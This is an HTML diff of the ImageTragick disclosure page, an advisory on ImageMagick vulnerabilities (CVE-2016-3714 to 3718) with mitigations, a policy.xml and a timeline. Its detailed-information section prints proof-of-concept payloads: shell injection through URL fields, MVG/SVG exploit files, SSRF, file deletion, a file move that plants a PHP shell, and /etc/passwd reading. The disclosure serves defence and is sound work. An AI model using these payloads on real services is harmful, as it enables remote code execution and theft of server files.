@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="css/bootstrap.min.css" rel="stylesheet">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+<title>ImageTragick</title>
+</head>
+<body>
+<div class="container">
+<div class="page-header">
+<h1 id="navbar">ImageTragick</h1>
+<i>Make ImageMagick Great Again</i>
+</div>
+<div class="col-md-8">
+<i>Updated 5/12</i><br>
+<a href="#moreinfo">lcamtuf With Advice On Better Mitigations</a><br>
+<i>Updated 5/5</i><br>
+<a href="#policy">Updated Policy Recommendation</a><br>
+<i>Updated 5/4</i><br>
+<a href="#why">What's with the stupid (logo|website|twitter account)?</a><br>
+<a href="#info">Detailed Vulnerability Information</a><br>
+<a href="https://github.com/ImageTragick/PoCs">PoC</a><br>
+<i>Updated 5/3</i><br>
+<a href="#FAQ">FAQs</a><br>
+<h2>ImageMagick Is On Fire — CVE-2016–3714</h2>
+<h3>TL;DR</h3>
+<p>There are multiple vulnerabilities in <a href="https://www.imagemagick.org/">ImageMagick</a>, a package commonly used by web services to process images. One of the vulnerabilities can lead to remote code execution (RCE) if you process user submitted images. The exploit for this vulnerability is being used in the wild.</p>
+<p>A number of image processing plugins depend on the ImageMagick library, including, but not limited to, PHP’s imagick, Ruby’s rmagick and paperclip, and nodejs’s imagemagick.</p>
+<p>If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one of these two things (but preferably both!):</p>
+<ol>
+<li>Verify that all image files begin with the expected <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">"magic bytes"</a> corresponding to the image file types you support before sending them to ImageMagick for processing. (see <a href="#FAQ">FAQ</a> for more info)</li>
+<li>Use a <a href="https://www.imagemagick.org/script/resources.php">policy file</a> to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in “/etc/ImageMagick”. The below policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL.</li>
+</ol>
+<div id="policy" class="panel panel-info">
+<div class="panel-heading">
+<h3 class="panel-title">policy.xml (updated 5/5)</h3>
+</div>
+<div class="panel-body">
+<pre>
+&lt;policymap&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;TEXT&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;SHOW&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;WIN&quot; /&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PLT&quot; /&gt;
+&lt;/policymap&gt;
+</pre>
+</div>
+</div>
+<div id="moreinfo">
+<h3>@lcamtuf With Advice On Better Mitigations</h3>
+<p>
+<a href="https://twitter.com/lcamtuf">@lcamtuf</a> has a <a href="https://lcamtuf.blogspot.com/2016/05/clearing-up-some-misconceptions-around.html">post</a> that talks about mitigations you should consider beyond the basic blacklisting recommended in the initial disclosure. You should read it.
+</p>
+<p>
+<i>Note: Contrary to what is stated in the post, we have recommended sandboxing in our <a href="#FAQ">FAQ</a><br> from the beginning.
+</p>
+</div>
+<div id="why">
+<h3>What's with the stupid (logo|website|twitter account)?</h3>
+<p>It would have been fantastic to eschew this ridiculousness, because we all make fun of branded vulnerabilities too, but this was not the right time to make that stand.
+<p>Initially, we disclosed this vulnerability via a blog post on Medium. We even joked in the post that the vulnerability didn't have a cool name or logo. The blog was read hundreds of times, but as the hours passed, we became worried that not enough people were aware of the vulnerability. Every script kiddie would have it in their hands soon, but a majority of people had no idea this vulnerability existed.
+<p>So we created a website, a twitter account, and used a logo that someone created as a joke the day before.</p>
+<p>What happened?</p>
+<p>We had thousands of hits in the first 15 minutes. We were at the top of hacker news, which a lot of people see. We were getting the word out on something tragickally simple to exploit. We'd do it again.</p>
+</div>
+<div id="info">
+<h3>Detailed Vulnerability Information</h3>
+<p>
+Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in ImageMagick. We've reported these issues to developers of ImageMagick and they made a fix for RCE in sources and released new version (6.9.3-9 released 2016-04-30 <a href="http://legacy.imagemagick.org/script/changelog.php">changelog</a>), but this fix seems to be incomplete. We are still working with developers.
+</p>
+<h4>ImageMagick: Multiple vulnerabilities in image decoder</h4>
+<h5>1. CVE-2016-3714 - Insufficient shell characters filtering leads to(potentially remote) code execution</h5>
+<i><p>Insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats.</p></i>
+<p>ImageMagick allows to process files with external libraries. This feature is called 'delegate'. It is implemented as a system() with command string ('command') from the config file delegates.xml with actual value for different params (input/output filenames etc). Due to insufficient %M param filtering it is possible to conduct shell command injection. One of the default delegate's command is used to handle https requests:</p>
+<pre><code>"wget" -q -O "%o" "https:%M"</code></pre>
+<p>where <code>%M</code> is the actual link from the input. It is possible to pass the value like
+<pre><code>`https://example.com";|ls "-la`</code></pre>
+and execute unexpected <code>'ls -la'</code>. (wget or curl should be installed)
+</p>
+<pre><code>$ convert 'https://example.com";|ls "-la' out.png
+total 32
+drwxr-xr-x 6 user group 204 Apr 29 23:08 .
+drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
+</code></pre>
+<p>The most dangerous part is ImageMagick supports several formats like
+svg, mvg (thanks to <a href="https://hackerone.com/stewie">Stewie</a> for his research of
+this file format and idea of the local file read vulnerability in
+ImageMagick, see below), maybe some others - which allow to include
+external files from any supported protocol including delegates. As a
+result, any service, which uses ImageMagick to process user supplied
+images and uses default <code>delegates.xml</code> / <code>policy.xml</code>, may be vulnerable to
+this issue.
+</p>
+<b>exploit.mvg</b>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg";|ls "-la)'
+pop graphic-context
+</code></pre>
+<b>exploit.svg</b>
+<pre><xmp><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
+<svg width="640px" height="480px" version="1.1"
+xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=
+"http://www.w3.org/1999/xlink";>
+<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
+x="0" y="0" height="640px" width="480px"/>
+</svg>
+</xmp></pre>
+
+  <b>Example execution</b>
+<pre><code>$ convert exploit.mvg out.png
+total 32
+drwxr-xr-x 6 user group 204 Apr 29 23:08 .
+drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
+</code></pre>
+
+  <p>
+  ImageMagick tries to guess the type of the file by it's content, so
+  exploitation doesn't depend on the file extension. You can rename
+  <code>exploit.mvg</code> to <code>exploit.jpg</code> or <code>exploit.png</code> to bypass file type checks. In
+  addition, ImageMagick's tool <code>identify</code> is also vulnerable, so it can't
+  be used as a protection to filter file by it's content and creates
+  additional attack vectors (e.g. via <code>less exploit.jpg</code>', because
+  <code>identify</code> is invoked via <code>lesspipe.sh</code>).
+  </p>
+
+  <p>
+  Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16
+  x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest
+  sources from 6 and 7 branches all are vulnerable. Ghostscript and wget
+  (or curl) should be installed on the system for successful PoC
+  execution. For svg PoC ImageMagick's svg parser should be used, not rsvg.
+  </p>
+
+  <b>
+
+  All other issues also rely on dangerous ImageMagick feature of external
+  files inclusion from any supported protocol in formats like svg and mvg.
+  </b>
+
+  <h5>
+  2. CVE-2016-3718 - SSRF
+  </h5>
+
+  <p>It is possible to make HTTP GET or FTP request:</p>
+
+  <b>ssrf.mvg</b>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+fill 'url(http://example.com/)'
+pop graphic-context</code></pre>
+
+  <b>the following then makes an http request to example.com</b>
+  <pre><code>$ convert ssrf.mvg out.png</code></pre>
+
+  <h5>3. CVE-2016-3715 - File deletion</h5>
+  <p>It is possible to delete files by using ImageMagick's 'ephemeral' pseudo protocol which deletes files after reading:</p>
+
+  <b>delete_file.mvg</b>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
+popgraphic-context
+</code></pre>
+
+<pre><code>$ touch /tmp/delete.txt
+$ convert delete_file.mvg out.png # deletes /tmp/delete.txt
+</code></pre>
+
+  <h5>4. CVE-2016-3716 - File moving</h5>
+  <p>It is possible to move image files to file with any extension in any
+  folder by using ImageMagick's 'msl' pseudo protocol. msl.txt and
+  image.gif should exist in known location - <code>/tmp/</code> for PoC (in real life
+  it may be web service written in PHP, which allows to upload raw txt
+  files and process images with ImageMagick):
+  </p>
+
+  <b>file_move.mvg</b>
+
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'msl:/tmp/msl.txt'
+popgraphic-context
+</code></pre>
+
+  <b>/tmp/msl.txt</b>
+
+<pre><xmp><?xml version="1.0" encoding="UTF-8"?>
+<image>
+<read filename="/tmp/image.gif" />
+<write filename="/var/www/shell.php" />
+</image>
+</xmp></pre>
+
+  <p>
+  <code>/tmp/image.gif</code> - image with php shell inside
+  (<a href="https://www.secgeek.net/POC/POC.gif">https://www.secgeek.net/POC/POC.gif</a> for example)
+  </p>
+
+<pre><code>$ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php</code></pre>
+
+  <h5>5. CVE-2016-3717 - Local file read (independently reported by original research author - <a href="https://hackerone.com/stewie">Stewie</a>)</h5>
+
+  <p>
+  It is possible to get content of the files from the server by using
+  ImageMagick's 'label' pseudo protocol:
+  </p>
+
+  <b>file_read.mvg</b>
+
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'label:@/etc/passwd'
+pop graphic-context
+</code></pre>
+
+<pre><code>$ convert file_read.mvg out.png</code></pre>
+
+   <p>produces file with text rendered from /etc/passwd</p>
+
+
+  <br>
+  <h5>Vulnerability Disclosure Timeline:</h5>
+  <ul>
+  <li>April, 21 2016 - file read vulnerability report for one of My.Com services from https://hackerone.com/stewie received by Mail.Ru Security Team. Issue is reportedly known to ImageMagic team.</li>
+  <li>April, 21 2016 - file read vulnerability patched by My.Com development team</li>
+  <li>April, 28 2016 - code execution vulnerability in ImageMagick was found by Nikolay Ermishkin from Mail.Ru Security Team while researching original report</li>
+  <li>April, 30 2016 - code execution vulnerability reported to ImageMagick development team</li>
+  <li>April, 30 2016 - code execution vulnerability fixed by ImageMagick (incomplete fix)</li>
+  <li>April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix)</li>
+  <li>May, 1 2016 - ImageMagic informed of the fix bypass</li>
+  <li>May, 2 2016 - limited disclosure to 'distros' mailing list</li>
+  <li>May, 3 2016 - public disclosure at https://imagetragick.com/</li>
+  </ul>
+
+</div>
+
+<div id="FAQ">
+  <h2 name="faq">FAQs</h2>
+
+  <h5><em>Who found this bug?</em></h5>
+  <p><a href="https://hackerone.com/stewie">Stewie</a> found the initial bug, and <a href="https://twitter.com/__sl1m">Nikolay Ermishkin</a> from the Mail.Ru Security Team found additional issues, including the RCE.</p>
+
+  <h5><em>Will you share the exploit with me?</em></h5>
+  <p>No. We would like to give people a chance to patch before it is more widely available. The exploit is trivial, so we expect it to be available within hours of this post. Updates and PoC will eventually be available here.</p>
+
+  <h5><em>What are "magic bytes"?</em></h5>
+  <p>The first few bytes of a file can often used to identify the type of file. Some examples are GIF images, which start with the hex bytes <strong>"47 49 46 38"</strong>, and JPEG images, which start with <strong>"FF D8"</strong>. <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">This list</a> on Wikipedia has the magic bytes for most common file types.</p>
+
+
+  <h5><em>Why are you disclosing a vulnerability like this?</em></h5>
+  <p>We have collectively determined that these vulnerabilities are available to individuals other than the person(s) who discovered them. An unknowable number of people having access to these vulnerabilities makes this a critical issue for everyone using this software. <a href="https://www.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588">ImageMagick also disclosed this on their forum a few hours ago</a>.</p>
+
+  <h5><em>How well-tested are these mitigations?</em></h5>
+  <p>They are effective against all of the exploit samples we’ve seen, but we cannot guarantee they will eliminate all vectors of attack.</p>
+
+  <h5><em>Are there other ways to mitigate?</em></h5>
+  <p>Sandboxing ImageMagick is worth investigating, but we are not providing specific instructions for doing this.</p>
+
+  <h5><em>Why is this post so short?</em></h5>
+  <p>We did not find this vulnerability ourselves. We understand the mechanisms involved, but credit for finding this vulnerability should go to the researcher(s).</p>
+
+  <h5><em>How can I contact you?</em></h5>
+  <p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2b42464a4c4e5f594a4c4248406b4c464a424705484446">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
+
+  <h5><em>Who is "we"?</em></h5>
+  <p>Us.</p>
+
+</div>
+
+
+</div>
+<div class="col-md-4">
+<img src="img/logo-medium.png" alt="ImageTragick logo" class="img-responsive center-block" />
+
+<a href="https://twitter.com/ImageTragick" class="twitter-follow-button" data-show-count="false" data-size="large">Follow @ImageTragick</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+</div>
+<div class="col-md-12">
+<footer class="footer">
+</footer>
+</div>
+</div> <!-- container -->
+<script src="js/jquery-1.11.3.min.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-77280312-1', 'auto');
+  ga('send', 'pageview');
+</script>
+</body>
+</html>
